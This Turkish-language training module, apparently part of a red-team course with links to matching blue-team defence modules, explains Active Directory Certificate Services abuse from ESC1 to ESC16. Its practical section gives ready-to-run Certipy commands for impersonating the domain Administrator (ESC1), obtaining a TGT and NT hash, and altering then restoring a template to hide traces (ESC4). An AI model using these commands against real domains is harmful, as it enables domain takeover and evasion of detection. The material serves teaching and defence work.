## 1. Kavramsal Temel — Neden Var?

Active Directory Certificate Services (AD CS), etki alanında Genel Anahtar Altyapısı (PKI) sağlayarak bilgisayarlara, kullanıcılara ve hizmetlere dijital sertifikalar dağıtır. Bir sertifikanın Active Directory ortamında bir saldırgan için nihai hedef olmasının temel nedeni **PKINIT (Public Key Cryptography for Initial Authentication)** mekanizmasıdır:

> **Kerberos PKINIT sayesinde geçerli bir kimlik doğrulama sertifikası, doğrudan bir Kerberos TGT'ye (Ticket Granting Ticket) dönüştürülebilir.**
> Sertifikanın "kime ait olduğunu" belirleyen alan **SAN (Subject Alternative Name)** özniteliğidir. Eğer sertifika şablonu veya CA yapılandırması talep sahibinin SAN alanını serbestçe belirlemesine izin veriyorsa, düşük yetkili bir kullanıcı `SAN: Administrator@corp.local` içeren bir sertifika alarak etki alanı yöneticisi adına Kerberos bileti elde eder.

Üstelik sertifikalar, **kurbanın parolası değiştirilse bile** geçerlilik süresi (genellikle 1 yıl) boyunca çalışmaya devam eder; bu da onları en güçlü kalıcılık (persistence) mekanizmalarından biri yapar.

SpecterOps'un 2021 yılında yayımladığı *"Certified Pre-Owned"* araştırmasıyla başlayan ve güvenlik topluluğunun katkılarıyla genişleyen bu zafiyet sınıfı **ESC1'den ESC16'ya kadar** uzanan kapsamlı bir kataloğa dönüşmüştür.

## 2. Teknik Derinlik — Sertifika Şablon Anatomisi ve ESC Kataloğu

### 2.1 Sertifika Şablonunun (Template) Kritik Alanları

Active Directory nesnesi olarak `CN=Certificate Templates,CN=Public Key Services,CN=Configuration` altında saklanan şablonların güvenliğini 4 temel öznitelik belirler:

```
  ┌─────────────────────── Certificate Template ────────────────────────┐
  │ 1. pkiExtendedKeyUsage (EKU):                                       │
  │    - Client Authentication (1.3.6.1.5.5.7.3.2)                      │
  │    - Smart Card Logon (1.3.6.1.4.1.311.20.2.2)                      │
  │    - PKINIT Client Authentication (1.3.6.1.5.2.3.4)                 │
  │    - Any Purpose (2.5.29.37.0) veya SubCA                           │
  │                                                                     │
  │ 2. msPKI-Certificate-Name-Flag:                                     │
  │    - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x00000001)                 │
  │      (Talep eden taraf sertifikaya istediği SAN/UPN değerini yazar) │
  │                                                                     │
  │ 3. msPKI-Enrollment-Flag:                                           │
  │    - CT_FLAG_PEND_ALL_REQUESTS (Yönetici onayı zorunluluğu)         │
  │    - CT_FLAG_NO_SECURITY_EXTENSION (KB5014754 SID uzantısını gizler)│
  │                                                                     │
  │ 4. DACL (Erişim Kontrol Listesi):                                   │
  │    - Authenticated Users / Domain Users için "Enroll" izni          │
  └─────────────────────────────────────────────────────────────────────┘
```

### 2.2 Klasik Zafiyetler (ESC1 – ESC8)

| Zafiyet | Tanım | Sömürü Özü | Karşı Blue Savunması |
|---|---|---|---|
| **ESC1** | İstemci Kimlik Doğrulama EKU'su + Talep Edenin SAN Belirlemesi (`ENROLLEE_SUPPLIES_SUBJECT`) | Saldırgan SAN alanına `Administrator` yazar $\rightarrow$ PKINIT ile DA TGT alır. | [Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md) |
| **ESC2** | Şablonda `Any Purpose` EKU'su veya EKU Tanımlanmamış Olması | Her amaca uygun sertifika verilir $\rightarrow$ İstemci kimlik doğrulamasında kullanılır. | [Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md) |
| **ESC3** | `Certificate Request Agent` (Kayıt Ajanı) EKU'su | Saldırgan kayıt ajanı sertifikası alır $\rightarrow$ Başka bir kullanıcı adına (`on-behalf-of`) sertifika ister. | [Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md) |
| **ESC4** | Şablon nesnesi üzerinde hatalı DACL (`WriteProperty`, `GenericAll`) | Saldırgan şablonu düzenleyerek `ENROLLEE_SUPPLIES_SUBJECT` bayrağını açar (ESC1 yapar) $\rightarrow$ Sömürür $\rightarrow$ Eski haline getirir. | [Blue 07.1](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.1_Sertifika_Sablonu_Izin_Denetimi_ESC.md) |
| **ESC5** | PKI Konfigürasyon nesnelerinde (`Public Key Services`) aşırı yetkili DACL | CA veya OID nesnelerini değiştirerek tüm PKI altyapısını ele geçirir. | [Blue 07.2](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.2_CA_Hardening_ve_ESC6.md) |
| **ESC6** | CA sunucusunda `EDITF_ATTRIBUTESUBJECTALTNAME2` bayrağının açık olması | Şablonda SAN kapalı olsa bile CA gelen SAN değerini kabul eder; tüm şablonlar evrensel ESC1 olur. | [Blue 07.2](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.2_CA_Hardening_ve_ESC6.md) |
| **ESC7** | CA üzerinde `ManageCA` veya `ManageCertificates` izinleri | Saldırgan reddedilen talepleri onaylar veya CA konfigürasyonunu (ESC6) aktif eder. | [Blue 07.2](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.2_CA_Hardening_ve_ESC6.md) |
| **ESC8** | Web Enrollment HTTP (`/certsrv`) arayüzünün NTLM imzalamasız olması | NTLM Relay ile makineleri (DC dahil) web arayüzüne yönlendirip sertifika alma. | [Blue 08.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md) |

### 2.3 Genişletilmiş ve Modern Zafiyetler (ESC9 – ESC16)

PKI ve Kerberos yamaları (özellikle KB5014754) sonrasında keşfedilen modern zafiyet vektörleri:

* **ESC9 (`CT_FLAG_NO_SECURITY_EXTENSION` Zayıflığı):**
  Microsoft, KB5014754 güncellemesiyle sertifikaların içine nesne SID'sini gömen bir güvenlik uzantısı (`szOID_NTDS_CA_SECURITY_EXT - 1.3.6.1.4.1.311.25.2`) ekledi. Bir şablonda `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı açıksa, sertifikaya SID gömülmez. Saldırgan, UPN yazma yetkisi (`GenericWrite`) olduğu bir kurbanın UPN'ini hedef yöneticiye çevirir, sertifika alır ve ardından UPN'i geri düzeltir; SID olmadığı için sertifika yönetici olarak geçerli kalır.
* **ESC10 (Weak Certificate Mapping):**
  Etki alanı denetleyicisinde `StrongCertificateBindingEnforcement` kayıt defteri değeri `0` (Devre Dışı) veya `1` (Uyumluluk Modu) ise, DC sertifikadaki UPN veya `altSecurityIdentities` alanını SID doğrulaması olmadan kabul eder.
* **ESC11 (ICPR Relay — RPC Tabanlı AD CS Relay):**
  Web Enrollment (`ESC8`) kapalı olsa bile, AD CS'in RPC kayıt arayüzü (`MS-ICPR`) paket imzalama (`RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`) zorunlu kılınmamışsa, SMB koersiyonu doğrudan RPC arayüzüne relay edilebilir.
* **ESC12 (CA Sunucusunda Shell / YubiHSM Manipülasyonu):**
  CA sunucusunda yerel yönetici erişimi olan saldırganın, CA özel anahtarını (`certutil -backupKey`) veya HSM donanım kütüphanesini manipüle ederek sahte sertifikalar üretmesi.
* **ESC13 (Issuance Policies OID İstismarı):**
  Bir sertifika şablonuna bağlanan özel bir İlke OID'si (Issuance Policy), etki alanındaki evrensel bir güvenlik grubuna (Universal Security Group) bağlanmışsa, o sertifikayı alan herhangi bir kullanıcı otomatik olarak o grubun üyesi yetkilerini kazanır.
* **ESC14 (altSecurityIdentities Üzerinde Zayıf Açık Eşleme):**
  Bir kullanıcının `altSecurityIdentities` özniteliğine (`X509RFC822`, `X509IssuerSubject`) yazma yetkisi olan saldırgan, başka bir sertifikayı doğrudan kurban nesnesine eşleyerek kimliği ele geçirir.
* **ESC15 (Şema v1 Şablonlarında EKU Manipülasyonu):**
  Eski Windows 2000 dönemi Şema v1 sertifika şablonlarında EKU doğrulamalarının esnek bırakılması sonucu istemci kimlik doğrulamasına geçiş.
* **ESC16 (Windows Server 2025 dMSA PKINIT İstismarı):**
  Yeni dMSA (Delegated Managed Service Account) hesaplarının sertifika tabanlı yetkilendirme zincirlerindeki ayrıcalık sıçramaları.

## 3. Pratik Uygulama — Certipy ile Denetim ve Sömürü

### 3.1 Zafiyetli Şablonları Otomatik Tarama

```bash
# Certipy ile etki alanındaki tüm ESC1-ESC13 zafiyetlerini listeleme
certipy find -u jdoe@corp.local -p 'Welcome123!' -dc-ip 10.10.10.5 -vulnerable -stdout
```

---

### 3.2 ESC1 Sömürüsü (Administrator Adına Sertifika Talebi)

```bash
# 1. Zafiyetli şablondan Administrator SAN'ı ile sertifika talep etme
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' \
  -template 'UserAuthentication' -upn Administrator@corp.local -dc-ip 10.10.10.5

# 2. Üretilen administrator.pfx ile PKINIT üzerinden TGT ve NT Karması alma
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
```

**Başarılı Çıktı Örneği:**
```text
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Saving certificate and private key to 'administrator.pfx'
[*] Authenticating using PKINIT...
[*] Got TGT for Administrator@corp.local
[*] Got NT hash for Administrator: 31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### 3.3 ESC4 Sömürüsü (Şablon DACL Modifikasyonu ve Geri Alma)

```bash
# 1. Şablonu geçici olarak ESC1 konfigürasyonuna çevirme (orijinal ayarları kaydeder)
certipy template -u jdoe@corp.local -p 'Welcome123!' -template 'SecureWeb' \
  -save-old -write-default-configuration -dc-ip 10.10.10.5

# 2. Şablon artık ESC1 olduğundan sertifika talep edin
certipy req -u jdoe@corp.local -p 'Welcome123!' -ca 'CORP-CA' \
  -template 'SecureWeb' -upn Administrator@corp.local -dc-ip 10.10.10.5

# 3. İzi temizlemek için şablonu orijinal konfigürasyonuna döndürün
certipy template -u jdoe@corp.local -p 'Welcome123!' -template 'SecureWeb' \
  -configuration SecureWeb.json -dc-ip 10.10.10.5
```

## 4. Sorun Giderme ve Hata Kodları (Troubleshooting)

| Hata Kodu / Mesaj | Teknik Neden | Çözüm / Yaklaşım |
|---|---|---|
| `KDC_ERR_PADATA_TYPE_NOSUPP` | Domain Controller üzerinde PKINIT yapılandırılmamıştır (DC'nin kendi DomainController sertifikası eksik). | DC'nin geçerli bir KDC sertifikasına sahip olduğundan emin olun veya başka bir DC üzerinden deneyin. |
| `CERT_E_ROLE` / `E_ACCESSDENIED` | Talep eden kullanıcının şablon üzerinde `Enroll` izni yoktur. | Şablon DACL'ini kontrol edin; `Authenticated Users` veya `Domain Users` izinli başka bir şablon bulun. |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | KDC, sertifikayı imzalayan CA kök sertifikasına (`NTAuthCertificates`) güvenmiyor. | CA'nın etki alanı güven zincirinde (`Enterprise CA`) olduğundan emin olun. |
| `CERTSRV_E_ENROLL_DENIED` | Şablonda yönetici onayı (`Manager Approval`) şartı açıktır. | Onay gerektirmeyen alternatif şablonları araştırın veya ESC7 yetkiniz varsa talebi kendiniz onaylayın. |
